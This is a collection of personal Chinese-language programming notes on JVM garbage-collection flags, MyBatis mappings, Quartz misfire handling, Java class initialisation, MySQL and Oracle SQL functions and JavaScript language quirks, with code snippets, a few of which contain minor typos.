-XX:+DisableExplicitGC禁止System.gc() (注意direct memory 释放失败) Full GC(System)

--------------------------------------------------------------------------------------
一个线程尝试进入另一个线程正在执行的同步块或者方法时,便会出现锁竞争第二个线程就必须等待前一个线程执行完这个同步块并释放掉监视器
--------------------------------------------------------------------------------------
-XX:+PrintGCTimeStamps JVM启动至今的时间戳
-XX:+PrintGCDateStamps 绝对的日期和时间
--------------------------------------------------------------------------------------
保存错误日志
-XX:ErrorFile=/var/log/java/java_error%p.log
--------------------------------------------------------------------------------------
GC 和 [Full GC 是垃圾回收的停顿类型

方括号内部显示的 "4928K->512K(4928K)" 表示 "GC 前该区域已使用容量 -> GC 后该区域已使用容量 (该区域内存总容量)
"6835K->3468K(15872K)" 表示 "GC 前Java堆已使用容量 -> GC后Java堆已使用容量 （Java堆总容量）

新生代
[ParNew: 1770882K->212916K(1835008K), 0.0834220 secs]
5240418K->3814487K(24903680K), 0.0837310 secs]
Young GC回收了1770882-212916=1557966K内存
Heap通过这次回收总共减少了 5240418-3814487=1425931 K的内存
1557966-1425931=132035K说明这次Young GC有约128M的内存被移动到了Old Gen

老年代
CMS的gc日志重点关注initial-mark和remark这两个阶段,因为这两个阶段会stop进程

--------------------------------------------------------------------------------------
mybatis中懒加载
<setting name="lazyLoadingEnabled" value="true"/>  --全局性设置懒加载
<setting name="aggressiveLazyLoading" value="false"/>

association、collection具备延迟加载功能
不建议使用嵌套的select语句 N+1

<association property="supervisor" javaType="Teacher"
column="supervisor_id" select="selectSupervisor"/>  N+1

<association property="supervisor" javaType="Teacher"
resultMap="supervisorResultMap"/>

<collection property="orderdetails" ofType="cn.itcast.mybatis.po.Orderdetail">
      <id column="orderdetail_id" property="id"/>
      <result column="items_id" property="itemsId"/>
      <result column="items_num" property="itemsNum"/>
      <result column="orders_id" property="ordersId"/>
</collection>

执行了一个单独的 SQL 语句来获取结果列表（就是+1）
对返回的每条记录,你执行了一个查询语句来为每个加载细节（就是N）
解决嵌套结果  关联的嵌套查询
<resultMap id="blogResult" type="Blog">
    <id property=”id” column="blog_id" />
    <result property="title" column="blog_title" />
    <association property="author" column="blog_author_id"
        javaType="Author" resultMap=”authorResult” />
</resultMap>


<resultMap type="Student" id="studentResult">
    <id property="id" column="id"/>
    <result property="name" column="name"/>
    <result property="age" column="age"/>
    <association property="grade" column="gradeId" javaType="Grade">
        <id property="id" column="grade_id"/>
        <result property="name" column="grade_name"/>
    </association>
</resultMap>

<select id="getStudent" resultMap="studentResult">
    SELECT
        s.id,
        s.name,
        s.age,
        g.id as grade_id,
        g.name as grade_name
    FROM student s LEFT OUTER JOIN grade g ON g.id=s.gradeId
    WHERE s.id=#{id}
</select>

<select id="getById" parameterType="int" resultMap="studentResultMap">
   select s.id s_id,
       s.name s_name,
       s.gender s_gender,
       s.major s_major,
       s.grade s_grade,
       t.id t_id,
       t.name t_name,
       t.gender t_gender,
       t.title t_title,
       t.research_area t_research_area
   from student s left join teacher t
    on s.supervisor_id = t.id
   where s.id=#{id}
</select>
<resultMap id="studentResultMap" type="Student">
   <id property="id" column="s_id"/>
   <result property="name" column="s_name"/>
   <result property="gender" column="s_gender"/>
   <result property="major"  column="s_major"/>
   <result property="grade"  column="s_grade"/>
   <!--使用resultMap属性引用下面的教师实体映射-->
   <association property="supervisor" javaType="Teacher"
   resultMap="supervisorResultMap"/>
</resultMap>
<!--教师实体映射-->
<resultMap id="supervisorResultMap" type="Teacher">
   <id property="id" column="t_id"/>
   <result property="name" column="t_name"/>
   <result property="gender" column="t_gender"/>
   <result property="researchArea" column="t_research_area"/>
   <result property="title" column="t_title"/>
</resultMap>



<select id="getUserList" resultMap="userdetailResult">
    SELECT
        u.id as user_id,
        u.name as user_name,
        u.create_date,
        r.id as role_id,
        r.name as role_name
    FROM t_user u
    LEFT JOIN t_user_role ur ON(u.id=ur.user_id)
    LEFT JOIN t_role r ON(r.id=ur.role_id) where u.id=1
</select>
<resultMap id="userdetailResultNew"  type="User">
  <id property="id"  column="user_id" />
  <result property="name" column="user_name"/>
  <result property="createDate" column="create_date"/>
  <collection property="roles"  ofType="Role" javaType="ArrayList">
      <id property="id"  column="role_id"/>
      <result property="name"  column="role_name"/>
  </collection>
</resultMap>
<resultMap id="roleResult" type="Role">
  <id property="id"  column="role_id"/>
  <result property="name"  column="role_name"/>
</resultMap>
<resultMap id="userdetailResult"  type="User">
  <id property="id"  column="user_id" />
  <result property="name" column="user_name"/>
  <result property="createDate" column="create_date"/>
  <collection property="roles"  ofType="Role" javaType="ArrayList" resultMap="roleResult"/>
</resultMap>

<resultMap id="UsersAndItemsResultMap" type="com.rhwayfun.mybatis.po.User">
    <!-- 用户信息 -->
    <id column="user_id" property="id"/>
    <result column="username" property="username"/>
    <result column="sex" property="sex"/>
    <result column="address" property="address"/>
    <!-- 订单信息 -->
    <!-- 一个用户可以有多个订单 -->
    <collection property="ordersList" ofType="com.rhwayfun.mybatis.po.Order">
        <id column="orders_id" property="id"/>
        <result column="user_id" property="id"/>
        <result column="number" property="number"/>
        <result column="createtime" property="createtime"/>
        <result column="note" property="note"/>
        <!-- 订单明细信息 -->
        <!-- 一个订单包含有多个订单明细 -->
        <collection property="orderdetails" ofType="com.rhwayfun.mybatis.po.Orderdetail">
            <id column="orderdetails_id" property="id"/>
            <result column="items_id" property="itemsId"/>
            <result column="items_num" property="itemsNum"/>
            <result column="orders_id" property="ordersId"/>
            <!-- 一个订单明细对应一个商品 -->
            <association property="items" javaType="com.rhwayfun.mybatis.po.Items">
                <id column="item_id" property="id"/>
                <result column="item_name" property="name"/>
                <result column="item_detail" property="detail"/>
                <result column="item_price" property="price"/>
            <association/>
        </collection>
    </collection>
</resultMap>
<select id="findUsersAndItemsResultMap" resultMap="UsersAndItemsResultMap">
    select order.*,user.username,user.sex,user.address,
      orderdetails.orderdetails_id,orderdetails.items_id,orderdetails.items_num,
      orderdetails.orders_id,
      item.id item_id,item.name item_name,
      item.detail item_detail,item.price item_price
      from user,order,orderdetails,item
      where user.id = order.user_id
      and order.id = orderdetaisl.orders_id
      and orderdetails.items_id = item.id
</select>

--------------------------------------------------------------------------------------
原码 第一位表示符号, 其余位表示值 -1 1000 0001

反码
正数的反码是其本身
负数的反码是在其原码的基础上,符号位不变,其余各个位取反 11111110

补码
正数的补码就是其本身
负数的补码是在反码的基础上+1 11111111
--------------------------------------------------------------------------------------
https://github.com/2-dfire/twodfire-monitor 超时监控
--------------------------------------------------------------------------------------
如何避免Quartz重复启动任务

先把quartz配置信息提取出来,单独存成一个文件,比如applicationContext-quartz.xml
然后修改web.xml,让web容器启动时,可以加载该文件

org.quartz.jobStore.misfireThreshold = 60000 #60秒  默认值
当前时超过已安排时间多久的作业不执行 misfireThreshold只有当job任务被阻塞时才有效

没有线程资源而被延迟执行叫触发器超时
任务A应该在2点执行 但现在晚了5秒钟5秒钟就是任务超时时间,或者叫触发器(Trigger)超时时间

一个触发器超时时间如果大于misfireThreshold的值 就认为这个触发器真正的超时
小于misfireThreshold的值, 那么调度引擎则不认为触发器超时

处理策略 misfireInstruction (SimpleTrigger)
MISFIRE_INSTRUCTION_FIRE_NOW    1  对错失的调度不处理

MISFIRE_INSTRUCTION_RESCHEDULE_NOW_WITH_REMAINING_REPEAT_COUNT   3
继续重复执行的次数等于本次+剩余的次数,即剩余次数+1,misfire job不会再执行.
比如,3s执行一次,重复执行5次,05:08:11开始执行,那么理应重复执行的时间点是05:08:11,05:08:14,05:08:17,05:08:20,05:08:23,05:08:26,
但如果第一次执行的时间是11s,执行完的时间点是：05:08:22,,那么即将执行的时间点是05:08:22,
而且从这点开始,还有05:08:23,05:08:26,这两次没执行,所以即将执行后,还会再执行2次
所以之后的执行时间点是：05:08:22,05:08:25,05:08:28

MISFIRE_INSTRUCTION_RESCHEDULE_NEXT_WITH_EXISTING_COUNT   5
misfire job不会再执行,到下一个触发点再执行,继续重复执行的次数等于剩余次数-1
3s执行一次,重复执行5次,02:28:38开始执行,那么理应重复执行的时间点是02:28:38,02:28:41,02:28:44,02:28:47,02:28:50,02:28:53
但如果第一次执行时间用了11s,到02:28:49结束,那下次执行时间是02:28:50,02:28:53,只有(2-1)=1次,所以一次执行时间点是：02:28:50

MISFIRE_INSTRUCTION_RESCHEDULE_NEXT_WITH_REMAINING_COUNT  4
misfire job不会再执行,到下一个触发点再执行,继续重复执行的次数等于剩余次数-1.
会根据第一次执行的时间,然后从当前时间开始,到终止时间,计算还能执行的剩余次数,重复执行这个剩余次数相当于重新计算剩余次数,进行调度
3s执行一次,重复执行5次,从 05:18:52开始,理论上依次执行的时间点是 05:18:55,05:18:58,05:19:01,05:19:04,05:19:07
但如果第一次执行了11s,到05:19:03结束,则继续按照本来的调度,下次执行的开始时间是05:19:04,接着执行05:19:07
且错过的05:18:55,05:18:58,05:19:01的触发不会再执行下去

MISFIRE_INSTRUCTION_RESCHEDULE_NOW_WITH_EXISTING_REPEAT_COUNT  2
不会丢失misfire job,从当前时刻开始重新计算每次执行时间点,重做misfire的job
如：3s执行一次,重复执行5次,05:24:44开始,每次时间点理应是：05:24:47,05:24:50,05:24:53,05:24:56,05:24:59
但由于第一次执行用了11s,到05:24:55结束,那么从05:24:55开始重新计算剩余次数5次的每次执行的时间点,假设剩余执行每次只需执行2s时间,不会Misfire
那么剩余执行调度的时间点是：05:24:55,05:24:58,05:25:01,05:25:04,05:25:07

MISFIRE_INSTRUCTION_SMART_POLICY    0   default
如果没有自定义的话,当misfire后,即将执行,不会丢失misfire job

http://code.qtuba.com/article-42426.html
http://blog.csdn.net/liangbinny/article/details/18790947

<bean id="simpleTrigger" class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean">
        <property name="jobDetail">
            <ref bean="simpleJobDetail"/>
        </property>
        <!-- <property name="startDelay" value="1" /> -->
        <!-- 每3s执行一次 -->
        <property name="repeatInterval" value="3000" />
        <property name="repeatCount" value="5" />
        <property name="misfireInstruction"><value>0</value></property>
</bean>

希望指定流程图的运行之间的间隔为 90 分钟您可按如下方式设置两个重现计划安排

计划安排 A
开始时间：上午 7 点
间隔：3 小时
此计划安排使流程图在上午 7 点、上午 10 点等依此类推的时间运行

计划安排 B
开始时间：上午 8:30
间隔：3 小时

<bean id="timeZone" class="java.util.TimeZone" factory-method="getTimeZone">
   <constructor-arg value="GMT+08:00"/>
</bean>
<bean id="scanTaskTrigger" class="org.springframework.scheduling.quartz.CronTriggerFactoryBean">
   <property name="timeZone" ref="timeZone" />
</bean>

org.quartz.scheduler.skipUpdateCheck: true
--------------------------------------------------------------------------------------
-v取反
ps aux | grep -v whoami

--------------------------------------------------------------------------------------
inputstream.available()方法返回的值是该inputstream在不被阻塞的情况下一次可以读取到的数据长度
--------------------------------------------------------------------------------------
byte[] b = new byte[count];
int readCount = 0; // 已经成功读取的字节的个数
while (readCount < count) {
   readCount += in.read(bytes, readCount, count - readCount);
}
--------------------------------------------------------------------------------------
find . -name 'core' -type f -exec rm {} \; 对每个匹配的文件执行一个单独的rm操作

xargs将输入行转换成下一个命令的参数列表 \0分割
find . -name 'core' -type f -print0 | xargs -0 rm

--------------------------------------------------------------------------------------
-Xverifynone参数来关闭大部分的类验证措施,以缩短虚拟机类加载的时间
--------------------------------------------------------------------------------------
public final static int value= 123 ;
标注为final之后,value的值在准备阶段初始化为123而非0.

和静态变量一样
public static final int final_static_random_value = (int) (Math.random() * 100);

静态语句块只能访问到定义在静态语句块之前的变量,定义在它之后的变量,在前面的静态语句块可以赋值,但是不能访问
--------------------------------------------------------------------------------------
如果多个线程同时去初始化一个类,那么只会有一个线程去执行这个类的<clinit>()方法,其他线程都需要阻塞等待,直到活动线程执行<clinit>()方法完毕

--------------------------------------------------------------------------------------
通过数组定义来引用类,不会触发此类的初始化
常量在编译阶段会存入调用类的常量池中
--------------------------------------------------------------------------------------
静态变量的声明与初始化是两个不同的操作；
静态变量的声明在编译时已经明确了内存的位置
静态变量被保存到常量池中

静态代码块里面的变量都是局部变量,只在本块内有效
静态方法不能以任何方式引用this和super关键字,因为静态方法在使用前不用创建任何实例对象,当静态方法调用时,this所引用的对象根本没有产生

java静态变量初始化遵循以下规则:
静态变量会按照声明的顺序先依次声明并设置为该类型的默认值,但不赋值为初始化的值
声明完毕后,再按声明的顺序依次设置为初始化的值,如果没有初始化的值就跳过


--------------------------------------------------------------------------------------
1只有主动请求一个类,这个类才会初始化,仅包含静态变量,函数,等静态的东西.
2继承关系时,先初始化父类,后初始化子类.
3静态变量会按照声明的顺序先依次声明并设置为该类型的默认值,但不赋值为初始化的值.
4声明完毕后,再按声明的顺序依次设置为初始化的值,如果没有初始化的值就跳过.
5当初始化A.b=B.a时,暂停初始化A.b,设置当前类为B,跳到步骤3,并执行.
6当初始化B.plus = new A时,暂停初始化B.plus,实例化A并赋值给B.plus.
7当A的构造函数里需要获得B.a的值时,B.a还初始化并处于暂停初始化状态,直接取B.a的当前值,不再等待B.a初始化.
8final,静态常量其实是遵循普通静态变量的初始化的,但是在编译时,编译器会将不可变的常量值在使用的地方替换掉

主动请求一个类,有以下6种方式:
调用类A的静态变量.
实例化类A, 即 new A.
继承类A.
使用反射的方式获取类A.
类A是程序的入口类(即main函数所在的类)
--------------------------------------------------------------------------------------
非静态初始块移到构造函数开始处
静态变量和静态初始化块按顺序

定义在声明之前的静态化块只能对声明变量进行赋值,并不能使用该变量
--------------------------------------------------------------------------------------
Java 6中Arrays.sort()和Collections.sort()使用的是MergeSort,而在Java 7中,内部实现换成了TimSort
--------------------------------------------------------------------------------------
Comparator的实现必须保证以下几点（出自这儿）：
a). sgn(compare(x, y)) == -sgn(compare(y, x))
b). (compare(x, y)>0) && (compare(y, z)>0) 意味着 compare(x, z)>0
c). compare(x, y)==0 意味着对于任意的z：sgn(compare(x, z))==sgn(compare(y, z)) 均成立

public int compare(ComparatorTest o1, ComparatorTest o2) {
    return o1.getValue() > o2.getValue() ? 1 : -1;
}
违背了a)原则：假设X的value为1,Y的value也为1；那么compare(X, Y) ≠ –compare(Y, X)

public int compare(ComparatorTest o1, ComparatorTest o2) {
    return o1.getValue() == o2.getValue() ? 0 :
                (o1.getValue() > o2.getValue() ? 1 : -1);
}

java7 -Djava.util.Arrays.useLegacyMergeSort=true 使用java6排序 否则使用TimeSort
--------------------------------------------------------------------------------------
Arrays.sort和Collections.sort区别
Arrays.sort方法用于对象数组按用户自定义规则排序

Collections.sort用于对象集合按用户自定义规则排序常用于List集合进行排序
最终还是使用了Arrays.sort(a)

java8 Collections.sort-->list.sort-->Arrays.sort

https://github.com/abstools/java-timsort-bug
--------------------------------------------------------------------------------------
java避免缓存伪共享
使用  @sun.misc.Contended注解 ConcurrentHashMap用到
jvm启动时设置-XX:-RestrictContended

实现缓存行填充,JVM在计算对象布局时自动根据CPU的特性给这个类添加padding

-XX:-EnableContended 完全禁止JVM的Variable Padding功能
减小Thread以及ConcurrentHashMap类型的内存空间占用
--------------------------------------------------------------------------------------
调用sleep()函数,网络编程中的阻塞accept()【等待客户端连接】和阻塞recv()【等待下游回包】
也不占用CPU资源
--------------------------------------------------------------------------------------
(String)、toString()与String.valueOf()的区别
(String)、Object.toString()正常情况下跟String.valueOf()没有区别
但当Object是null的时候toString会抛出异常、valueOf返回"null",而(String)返回null
--------------------------------------------------------------------------------------
mysql found_row()和row_count()函数用于计算上一条语句影响的行数,
不同的是found_row用来获取Select得到的行数,
而row_count用来获取Update或Delete影响的行数

update前后的值一样,row_count则为0
row_count()必须立即在UPDATE语句执行后使用,才能得到刚执行的语句影响了多少记录

--------------------------------------------------------------------------------------
JavaBean是一种特殊的类,主要用于传递数据信息,这种类中的方法主要用于访问私有的字段,且方法名符合某种命名规则

--------------------------------------------------------------------------------------
apache common beanutils
PropertyUtils类和BeanUtils不同在于,运行getProperty、setProperty操作时,没有类型转换

--------------------------------------------------------------------------------------
BeanUtils不同点
org.apache.commons.beanutils.BeanUtils.copyProperties(destBean, srcBean);
org.springframework.beans.BeanUtils.copyProperties(srcBean,destBean);


--------------------------------------------------------------------------------------
mysql
substring_index('www.sqlstudy.com.cn', '.', 2) 截取第二个.之前的部分 www.sqlstudy.com
substring_index('2016-1-2 3:4:5', ':', 1)  2016-1-2 3
substring_index('www.sqlstudy.com.cn', '.', -2) com.cn

按查询顺序排序
select * from db_ap_rgsh_report_excelconfig
where id in(9,1,8)
order by find_in_set(','+id+',', ',9,1,8,')

取一组值中的最大值
select greatest(1,3,5,6,9,12)

select rand()  返回在范围0到1.0内的随机浮点值,整数参数N被指定,它被用作种子值

# 比较两个字符串的大小
select strcmp('hell', 'yes')

# 字符串查找定位
select position('yes' IN 'hyesman') 2

# 求平方 4的2次方 16
select pow(4,2)

# 求开方
select sqrt(9)

返回π
select pi()

select timestamp(current_date(),'17:00:00')  当前日期 17:00:00

show variables like '%innodb_autoinc_lock_mode%'
0：通过表锁的方式进行
1：默认值,对于simple insert 自增长值的产生使用互斥量对内存中的计数器进行累加操作,对于bulk insert 则还是使用表锁的方式进行
2：对所有的insert-like 自增长值的产生使用互斥量机制完成,性能最高,
并发插入可能导致自增值不连续,可能会导致Statement 的 Replication 出现不一致,
使用该模式,需要用 Row Replication的模式

在master-slave这种架构中,复制如果采用statement-based replication这种方式,
则innodb_autoinc_lock_mode=0或1才是安全的
采用row-based replication或者mixed-based replication,0,1,2都是安全的


产生间隙原因
simple inserts  事务出现回滚时

实现一条记录对应一个序列的策略
id` bigint(20) unsigned NOT NULL DEFAULT '0',

insert into `test_mysql_sequence` (`name`) values('new_business')
on duplicate key update `id` = last_insert_id(`id` + 1);
select last_insert_id();

MySQL：

在Linux下
1、数据库名与表名是严格区分大小写的；

2、表的别名是严格区分大小写的；

3、列名与列的别名在所有的情况下均是忽略大小写的；

4、变量名也是严格区分大小写的；

Windows下都不区分大小写

lower_case_table_names
为0时（Linux默认）,大小写敏感,创建和查询都是区分大小写；
为1时,创建表以小写,查询表也是以小写；
为2时,创建表区分大小写,查询表以小写

改为1时原有大写表可能找不到

*_bin: 表示的是binary case sensitive collation, 区分大小写,可以存二进制的内容
default collate=utf8_bin

--------------------------------------------------------------------------------------
oracle随机值
select trunc(dbms_random.value(1, 51)) random_numbers  1-50
  from dual
connect by level <= 6;

select * from bs_static_data order by dbms_random.random

--------------------------------------------------------------------------------------
@SafeVarargs 这个是java7加入,代表堆污染的警告
@SuppressWarnings 抑制编译器的警告

--------------------------------------------------------------------------------------
Instant表示某一个时间点的时间戳,可以类比于java.uti.Date支持各种运算操作：
Duration表示Instant之间的时间差,可以用来统计任务的执行时间,也支持各种运算操作

Period用来表示两个LocalDate之间的时间差
TemporalAdjusters用于表示某个月第一天、下个周一等日期

ZonedDateTime表示带时区的日期和时间
--------------------------------------------------------------------------------------
jinfo -flag MaxDirectMemorySize 1972
非堆内存 -XX:MaxDirectMemorySize

--------------------------------------------------------------------------------------
Basically Available：基本可用；
Soft-state：软状态/柔性事务,即状态可以有一段时间的不同步；
Eventual consistency：最终一致性；

base是反 ACID 的,它完全不同于 ACID 模型,牺牲强一致性,获得基本可用性和柔性可靠性并要求达到最终一致性
--------------------------------------------------------------------------------------
在局部作用域中,使用var操作符定义的变量将成为定义该变量的作用域中的局部变量,省略var的会创建全局变量
在全局作用域中使用var创建的全局变量是不能被delete删除的,
而未使用var创建的变量和局部作用域中未使用var操作符创建的全局变量是可以删除的

var a = 1;         //  全局作用域使用var创建全局变量
b = 2;
delete a;          //false
delete b;          //true
console.log(typeof a);    //number
console.log(typeof b);    //undefined

直接定义在window对象上的属性可以删除
var a = 10;
window.b = 20;

//IE < 9 时抛出错误,其他浏览器中返回false
delete window.a;
//IE < 9 时抛出错误,其他浏览器中返回true
delete window.b;

console.log(window.a); //10
console.log(window.b); //undefined

undefined不是关键字,也不是保留字 eval、arguments之类的也不是关键字或者保留字,并且可以更改它们的值

<!DOCTYPE html>
如果在文档开始没发现文档声明,则浏览器会默认开启混杂模式

typeof null  的值为"object",含义：null值表示空对象指针
typeof null     //"object"
null instanceof Object  //false

Array类型的原型是数组
Array.isArray(Array.prototype );   //true

浮点数中必须包含一个小数点,并且小数点后面必须至少有一位数字(不为0),否则作为整数值保存
(1.0000000000+"").length    //1

(1).toString()   // "1"
1..toString()    // "1"

NaN表示"不是数字类型",但是typeof NaN的值为"number"NaN不等于任何值,包括它自己
typeof NaN    //"number"
NaN == NaN    //false

对未初始化和未声明的变量执行typeof操作符都会返回undefined值
未初始化的变量我们可以进行加减乘除等操作,而未声明的操作只能进行typeof操作

数组的长度可以修改,并且会影响数组元素的值
arr.length = 1;

函数的length属性表示函数希望接受的命名参数的个数
(function fn(a,b,c){}).length     //3

函数有一个非标准的属性——name,通过它我们可以访问该函数的名字,该属性是只读的（IE不支持）
function foo() { }
foo.name //foo

Infinity比除自己之外的其它值都大,-Infinity比除自己之外的其它值都小,-0和+0相等

连续大于号或者小于号的比较问题,从左向右依次进行,并且需要注意隐式转换
3 < 2 < 1    // true
3 > 2 > 1    //false
4 > 3 < 2 > 1 == 0  //true

var arr = [1,,2,];
arr.forEach(function(x,i) {
    console.log(i + " => "+x );   //0 => 1   2 => 2
});

如何创建稀疏数组
1) 使用构造函数Array()  var arr1 = new Array(3);
2) 简单地指定数组索引值大于当前数组的长度 arr2[100] = 4;
3) 使用delete操作符 delete arr3[0];
4) 省略数组直接量中的值  var arr5 = [1,,2,];
5) 指定length属性 arr6.length = 3;

in操作符的用法
1) 对于一般的对象判断某个属性是否属于对象
2) 对于数组可以指定数字形式的索引值来判断该位置是否存在数组元素
3) 使用delete删除属性之后,使用in检查该属性返回false
4) 将属性值设置为undefined,使用in检查返回true
var obj = {
    name: 'Marco',
    age: 24
}
console.log('name' in obj);   //true
delete obj.name;
console.log('name' in obj);   //false

obj.age = undefined;
console.log('age' in obj);    //true

var arr = [1,2,3];
console.log(0 in arr);        //true
console.log(3 in arr);        //false


null == undefined  //true
[] == []     //false


全等运算符比较准则：
1) 如果数据类型不同,返回false
2) 如果两个被比较的值类型相同,值也相同,并且都不是 number 类型,返回true
3) 如果两个值都是 number 类型,当两个都不是 NaN,并且数值相同,或是两个值分别为 +0 和 -0 时,两个值被认为是全等
4) NaN === NaN  返回false
NaN === NaN   //false
+0 === -0     //true

在定时器（setTimeout和setInterval）和requestAnimationFrame的回调函数中,
无论是否使用严格模式,this的值都是全局对象
var name = "baby";
var obj = {
    name: 'Marco',
    getname: function() {
        setTimeout(function(){
            console.log(this.name);
        },1000);
    }
}

obj.getname();  //baby

函数的形参是不可删除的

this
1) 直接调用函数,this的值为undefined（严格模式）或者window（非严格模式）
2) 作为对象方法调用,this的值为该对象
3) 作为构造函数调用（new）,this的值为新创建的对象
4) call、apply显式指定this的值

var name = "baby";
var fn;
var obj = {
    name: 'Marco',
    getname: function() {
        console.log(this.name);
    }
}

obj.getname();            //Marco
(fn = obj.getname)();     //baby   赋值表达式的结果为所赋的值

一个变量声明为arguments: arguments的初始值为原始值,而不是新定义的变量
function fn() {
    console.log(typeof arguments);
    var arguments = 1;
}

fn(1,2,3);     //object

形参重名：形参的初始值为最后一个同名形参所对应的实参的值,如果不存在,则为undefined
function fn(a,a,a) {
    console.log(a);
}
fn(1,2,3);    //3
fn(1,2);      //undefined

function fn() {
    console.log(a);   //undefined
    var a = 10;
    console.log(a);   //10
    var a;
    console.log(a);   //10
}

fn()

函数与形参重名：初始值为函数
变量与函数重名：初始值为函数

变量与形参重名：初始值为形参
function fn(a) {
    console.log(typeof a);
    var a = 10;
}

fn("Marco");     //string

一个形参为arguments：arguments的初始值为对应的实参
function fn(arguments) {
    console.log(arguments);
}

fn(1,2,3);     //1

call方法的第一个参数为null或者undefined,那么call方法将把全局对象（浏览器中为window）作为新的对象上下文
var x = "window_x";
var obj = {
    x: "obj_x",
    getX: function() {
        console.log(this.x);
    }
};

obj.getX();  //obj_x
obj.getX.call(null);  //window_x
obj.getX.call(undefined);  //window_x

arguments中保存的参数的值与对应的命名参数的值是保持同步的
arguments length属性的值是不变的,除非你手动修改length的值
function fn(a,b,x) {
    arguments[1] = 10;
    console.log(b);
}
fn(1,2);   //10

function fn(a,b,x) {
    arguments[2] = 10;
    console.log(x);
}
fn(1,2);   //undefined

function fn(a,b,x) {
    x = 10;
    console.log(arguments[2]);
}
fn(1,2);   //undefined

function fn(a,b,x) {
    arguments[2] = 10;
    arguments[3] = 20;
    console.log(arguments.length);
}
fn(1,2);   //2

function fn(a,b,x) {
    arguments.length = 10;
    console.log(arguments.length);
}
fn(1,2);   //10

arguments虽然有length属性,并可以通过[index]访问对应的值,但它并不是数组,然而我们可以通过Array.prototype.slice方法将它转换成数组
function fn (a,b) {
    console.log(Array.isArray(arguments));            //false
    arguments = Array.prototype.slice.call(arguments,0);
    console.log(Array.isArray(arguments));           //true
}
fn(1,2);


如果v1或者v2是对象,则转换为基本数据类型
如果v1或v2为字符串,或者原本为对象转换成基本数据类型后为字符串,则把另一个也转换成字符串,然后执行字符串链接操作得到结果
否则,转换为数字类型,返回它们的和
[] + []    // ""                              "" + ""
{} + []    // 0                               {}; +[]   =>   {}; +""     语句优先
[] + {}    //"[object Object]"                "" + "[object Object]"
{} + {}    // NaN                             {}; +{}   => NaN           语句优先
({}+{})    //"[object Object][object Object]"      "[object Object]" + "[object Object]"
({}+[])    //"[object Object]"                     "[object Object]" + ""

--------------------------------------------------------------------------------------
var aFn = (function(){
    var id = 0;
    console.log(id);//0
    return function(){
        return id++;
    }
})();

console.log(aFn());//0
console.log(aFn());//1
--------------------------------------------------------------------------------------
function print(){
    console.log(this);
};
//将第一个参数数字1,作为执行上下文对象
print.call(0,1,2);
//将第一个参数字符串'123',作为执行上下文对象
print.call('123');
//将第一个参数true,作为第执行上下文对象
print.call(true);
//将第一个参数对象,作为执行上下文对象
print.call(new Object());

//将null传入  window
print.call(null);
//将undefined传入 window
print.call(undefined);
//不传任何参数 window
print.call();

当参数明确的时候,使用call；当传递的参数不明确时,用 apply
function print(name, age, time){
    console.log("name: "+ name +"  age: "+ age +"  time: "+ time );
};
function fn(a, b, c){
    //使用call,参数明确
    print.call(this,a);
    //使用apply,参数明确
    print.apply(this,[a, b]);
    //使用apply,参数不明确
    print.apply(this,arguments);
}
fn('monkey',24,'1992');
--------------------------------------------------------------------------------------
var name = 'window';
var obj = {
     name:'monkey',
     print: function(){
         //在这里使用bind,显示地将this指向obj,所以console.log会输出'monkey'
         setTimeout(function(){
             console.log(this.name);
         }.bind(this),100);
     }
 };
 obj.print();

call或apply是将执行上下文对象换了后,立即执行；而bind是将执行上下文对象换了后,创建一个新函数
function fun(){
    console.log(this.name);
}
function obj1(){
    this.name = 'call||apply';
}
function obj2(){
    this.name = 'bind';
}
var o1 = new obj1();
var o2 = new obj2();
fun.call(o1);
fun.bind(o2);//function

//手动调用bind创建的新函数
fun.bind(o2)();


--------------------------------------------------------------------------------------
var randomItem = items[Math.floor(Math.random() * items.length)];
var x = Math.floor(Math.random() * (max - min + 1)) + min;

--------------------------------------------------------------------------------------
function isNumber(n){
return !isNaN(parseFloat(n)) && isFinite(n);
}

function isNumber(n) {
  return n === +n;
}
--------------------------------------------------------------------------------------
var a = 0;
var b = ( a++, 99 );  //逗号运算符
console.log(a); // a will be equal to 1
console.log(b); // b is equal to 99

--------------------------------------------------------------------------------------
var obj={"id":"1,"name":"test"}
for (var name in obj) {

  if (obj.hasOwnProperty(name)){

   console.log(name)

}
}
--------------------------------------------------------------------------------------
作为对象的方法调用   obj.a()
作为普通函数调用 　  a()
构造函数调用　　      var b = new a();

window.a = 2;
var obj = {
    a:1,
    getA:function(){
        console.log(this.a);
    }
}
obj.getA();       //输出1,作为对象的方法调用,this指向当前对象
var x = obj.getA;
x();   //输出2,作为普通函数调用,this全部指向window对象
只要最后是以x（）,fun（）这种方式调用的,均视为普通函数调用,此时this指向window对象
在ECMAScript5的strict模式下,作为函数调用的 this被规定不会指向全局对象

构造函数里的this指向返回的这个对象,但是如果构造器显示地返回了一个object类型的对象,则this指向这个返回的object对象
var Myclass = function(){
    this.name = 'beidan';
}
var obj = new Myclass();
console.log(obj.name);//beidan

var Myclass = function(){
    this.name = 'beidan';
    return{         //显示的返回一个对象,注意！既要是显示,即有return,也要是对象{}
        name:'test'
    }
}
var obj = new Myclass();
console.log(obj.name);//test
--------------------------------------------------------------------------------------
call,apply的用途
修正this的指向
var func = function(){
     console.log(this.id);
}
func.call(this);

--------------------------------------------------------------------------------------
oracle 表名空格 字段空格
create table " test blank name "
(
  " blank column2 " varchar2(20)
);
insert into " test blank name " values('1111')
select * from " test blank name " where " blank column2 "='1111'

select * from "test blank" where "blank column2" ='test'
select * from test_blank where " blank column2 " ='111'

mysql 表名字段开头中间可以有空格 不能以空格结尾
create table ` test blank name`(` test blank  column` varchar(20));
select * from ` test blank name` where ` test blank  column` ='111'

--------------------------------------------------------------------------------------
任务被投放到一个队列中(队列的数量不定)
线程从队列中取得任务并执行
线程完成任务后,继续尝试从队列中取得任务,如果队列为空,那么线程进入等待状态
--------------------------------------------------------------------------------------
ForkJoinPool主要用来使用分治法(Divide-and-Conquer Algorithm)来解决问题

使用ForkJoinPool能够使用数量有限的线程来完成非常多的具有父子关系的任务,
比如使用4个线程来完成超过200万个任务使用ThreadPoolExecutor时,是不可能完成的,
因为ThreadPoolExecutor中的Thread无法选择优先执行子任务,需要完成200万个具有父子关系的任务时,也需要200万个线程

ForkJoinPool的运行过程中,会创建大量的子任务而当他们执行完毕之后,会被垃圾回收反之,ThreadPoolExecutor则不会创建任何的子任务,因此不会导致任何的GC操

ForkJoinPool的另外一个特性是它能够实现工作窃取(Work Stealing),在该线程池的每个线程中会维护一个队列来存放需要被执行的任务当线程自身队列中的任务都执行完毕后,它会从别的线程中拿到未被执行的任务并帮助它执行
